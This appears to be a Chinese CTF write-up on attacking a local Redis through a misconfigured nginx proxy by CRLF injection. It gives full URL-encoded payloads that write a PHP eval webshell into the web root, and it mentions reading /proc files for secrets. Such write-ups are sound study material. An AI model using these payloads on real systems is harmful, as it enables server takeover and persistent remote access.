---
author: Noel
pubDatetime: 2024-10-27T21:54:11.000+08:00
modDatetime: 2024-10-27T21:54:11.000+08:00
title: 利用HTTP攻击Redis
featured: false
draft: false
tags:
  - 漏洞分析
  - 网络安全
description: |
    利用HTTP攻击Redis-buu金秋10月CTF Web Flow题分析
---

## Table of Content

## 前言

上周`buu 金秋10月CTF`的web`flow`题还是让人有点耿耿于怀。发现redis的过程就简单带过一下。主要利用 `/proc/net/tcp`发现本地`6379`存在监听，然后去读了下`redis日志`确认了确实存在该服务。

![image-20241021160009852](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-a82b7.png)

![image-20241021155517711](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-54ab9.png)

根据提示， `懒得配置`、 `plz rce me`. 很自然就会想到利用 `nginx` 转发去打 `Redis`。`nginx`配置如下：

![image-20241021155326648](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-31142.png)

其中重点在于这条转发配置：

```
location /proxy/ {
            rewrite ^/proxy/(.*)$ /$1 break;
            proxy_pass $scheme://$http_host/$1;
            proxy_set_header Origin $scheme://$http_host$uri;
        }
```

这条规则的工作原理如下：

1. `rewrite ^/proxy/(.*)$ /$1 break;`：将`/proxy/`后面的路径赋值给`$1`。

2. `proxy_pass $scheme://$http_host/$1;`：将请求转发到`scheme+Host头+$1`的地址。

3. `proxy_set_header Origin $scheme://$http_host$uri;`：设置转发的`Origin`信息。

本地搭建了下复现环境，使用`nc`测试一下，可以看到在web端发送的请求到了`nc`这里。

![image-20241027105013391](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-f9c12.png)

## 如何利用`nginx`攻击`Redis`？

参考文章：[通过http请求入侵redis](https://fdlucifer.github.io/2020/12/19/Trying-to-hack-Redis-via-HTTP-requests/#%E7%8E%AF%E5%A2%83) 可知，Redis接口是非常宽容的，它会尝试解析每个提供的输入(直到超时或’QUIT’命令)。

这里顺便提一下`TCP`和`HTTP`的区别,将`HTTP`看作是拥有**一定结构的TCP**，这个**一定结构**可以理解为：

1. 请求行（包含方法、URI、HTTP版本）
2. 请求头（包含客户端信息、请求体大小等）组成
3. 可选地还包括一个请求体。

`HTTP`本质上也是`TCP`，只要满足`Redis`的协议规范就可以了。

测试一下，可以看到redis是接受了一条指令。

![image-20241027105844767](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-1914d.png)

接下来的想法就是通过修改`HTTP`的请求结构，使得我们的命令可以以单独一行的形式出现。

又由于该`web应用`中使用了`nginx`作为转发，而`nginx`又是存在[CRLF缺陷](https://joker-vip.github.io/2021/11/10/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E/)的, 应此可以利用CRLF插入我们的命令，实现**Redis命令执行**。

## 如何插入命令（如何构造攻击载荷）

在构造之前，首先得了解Redis的通讯规则，在这篇文章中就可以找到：[redis通讯协议(RESP)](https://juejin.cn/post/6844903955235864589).

为了成功攻击Redis，我们需要构造符合`RESP协议`的HTTP请求。我们可以通过以下两种方法来构造这些请求

### 构造方法一：

1. 使用`strace`命令 `strace -s 4096 -tt -f -e trace=network redis-cli`, 可以看到`info`命令的具体请求数据为`*1\r   \n$4...`

![image-20241027120038953](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-42085.png)

2. 使用`Wireshark`抓包，通过跟踪tcp流找到执行的内容.

![image-20241027110418084](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-5204e.png)

根据RESP协议规则,那么发送命令的内容就是:

```
*1\r\n$4\r\ninfo\r\n
```

利用`CRLF`，构造出基本的请求格式：

```
\r\n*1\r\n$4\r\ninfo\r\n
```

接着将 `\r\n` 进行编码：

```
%0d%0a*1%0d%0a$4%0d%0ainfo%0d%0a
```

先使用`nc`测试下，发现为符合预期的输入。

![image-20241027110829666](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-143c3.png)

然后将该请求发往Redis, 从日志中可以看到命令执行成功，并且响应中返回了命令对应的内容：

![image-20241027111147213](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-b68fa.png)

接下来测试下常规的利用手法，写入webshell：

```
命令：config set dir /var/www/html
RESP协议：*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n
CRLFpayload：%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a


命令：set shell "\n\n\n<?php@eval($_POST['c']);?>\n\n\n" 
RESP协议：*3\r\n$3\r\nset\r\n$5\r\nshell\r\n$32\r\n\n\n\n<?php@eval($_POST['c']);?>\n\n\n\r\n
CRLFpayload：%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$5%0d%0ashell%0d%0a$32%0d%0a\n\n\n<%3fphp%40eval($_POST['c'])%3b%3f>\n\n\n%0d%0a
备注：记得将特殊字符进行urlencode处理


命令：config set dbfilename redis.php 
RESP协议：*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$9\r\nredis.php\r\n
CRLFpayload：%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0aredis.php%0d%0a


命令：save
RESP协议：*1\r\n$4\r\nsave\r\n
CRLFpayload：%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

monitor 日志如下：

![image-20241027114430949](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-32de7.png)

这里有两个需要注意的点：

1. 有些命令结果并不会直接在响应结果中出现，但是通过`Wireshark`记录可看到命令执行成功。但是由于是本地测试环境，所以能抓到本地的数据包，可以看到相应的结果。如果是远程环境，就没办法确认命令是否成功，几乎是属于盲打的状态，所以建议先在本地测试后再去远程。

> 盲打缺陷挺多的, 比如：
> 
> 1. 没办法确认目录是否存在
> 2. 没办法确认目录是否拥有写入权限
> 
> 比如后面写定时任务，由于是docker环境，不一定有cron环境，所以不太能确定是否写入成功。

![image-20241027114529527](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-59d6f.png)

2. 在`Redis` 的 `monitor`日志中发现:在写入`shell`时 ` \n` 被转义了，这里的解决办法是使用`%0a` 将 ` \n`  替换就可以了。

![image-20241027114405888](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-a5b06.png)

![image-20241027115047221](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-41097.png)

![image-20241027115130223](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-f0eed.png)

定时任务同理，这里就不再演示。。。

### 构造方法二：

除此之外，[文章](https://juejin.cn/post/6844903955235864589#heading-6)中还提到了：**`当Redis发现它收到的数据不是以"*"开头时, 它就会尝试解析这个字符串, 把它当做一个命令来处理, 然后返回对应的RESP格式的响应.`**

原文是通过`telnet`进行测试的，我这里使用`nc`测试一下, 可以看到在`nc`端输入`ping`命令时，可以在`monitor` 中看到执行日志，并且``nc`端也会收到`pong`的响应。

![image-20241027142520058](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-e6612.png)

因此构造命令可以简化为：

```
/proxy/%0d%0aping
```

![image-20241027145007376](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-432b0.png)

```
命令：config set dbfilename redis2.php
CRLF Payload：%0d%0aconfig%20set%20dbfilename%20redis2.php
```

![image-20241027145801132](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-17edf.png)

```
命令：set shell "<?php@eval($_POST['e']);?>"
CRLF Payload: %0d%0aset%20shell%20"<%3fphp%40eval($_POST['e'])%3b%3f>
注意：需要将空格使用 %20 表示。
```

![image-20241027145607884](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-e99d4.png)

```
命令：save
CRLF Payload：%0d%0asave
```

![image-20241027145634260](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-fca70.png)

最后上服务器上去查看，可以看到成功写入：

![image-20241027150831181](https://particles.oss-cn-beijing.aliyuncs.com/blog_img/20241027201616467-85980.png)

## 最后

最后一顿操作了半天，发现机器根本不出网。然后最后看wp的时候说的是，去读 `/proc/1/envrion` 就行了。

额。。。该喷还是得喷一下：不会出题就别出题。。。

最后整理了下文件读取的字典。。。[file_read dict](https://github.com/N0el4kLs/fuzzDicts/blob/master/ctfDict/file_read.txt)